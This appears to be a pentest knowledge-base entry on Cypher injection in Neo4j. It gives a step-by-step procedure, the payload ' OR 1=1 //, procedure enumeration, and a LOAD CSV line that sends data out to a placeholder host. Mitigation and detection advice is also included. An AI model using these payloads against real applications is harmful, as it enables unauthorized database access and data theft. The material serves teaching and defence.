---
topic: Inyección Cypher en Neo4j
tags: [web, neo4j, cypher, injection, database]
---

# Inyección Cypher en Neo4j

[🌐 Español](cypher-injection.md) | **English**

## Concept

Cypher is Neo4j's query language. If an application concatenates user input into a query, patterns, `WHERE`, `RETURN` or `LOAD CSV` clauses can be altered to extract data or reach system functions.

## When it applies

- A search or login endpoint queries Neo4j.
- Queries are built with `+` or `f-string`.
- The user controls labels, properties or the search term.

## Procedure

1. Confirm the engine through an error or characteristic response.
2. Try single quotes and boolean operators.
3. Match the column count with `UNION`.
4. Use `LOAD CSV` for out-of-band exfiltration if there is no direct output.
5. Review the Neo4j account permissions.

```cypher
MATCH (u:User) WHERE u.name = '<INPUT>' RETURN u
' OR 1=1 //
```

## Variants

- Injection in a label or relationship name.
- `CALL dbms.procedures()` to enumerate functions.
- `LOAD CSV FROM 'http://<HOST>/' AS line` for exfiltration.

## Limitations

- Neo4j may be localhost-only.
- The account may have restricted permissions.
- Parameterized queries block input.

## Mitigation

- Use parameters (`$name`) and never concatenate.
- Validate labels and properties against an allowlist.
- Restrict `LOAD CSV` and account permissions.

## Detection

- Queries containing `UNION`, `LOAD CSV` or comments.
- Cypher syntax errors in logs.
- Outbound connections initiated by Neo4j.

## References

- <https://neo4j.com/docs/cypher-manual/current/introduction/>
- <https://neo4j.com/docs/cypher-manual/current/values-and-types/parameters/>
- <https://attack.mitre.org/techniques/T1190/>
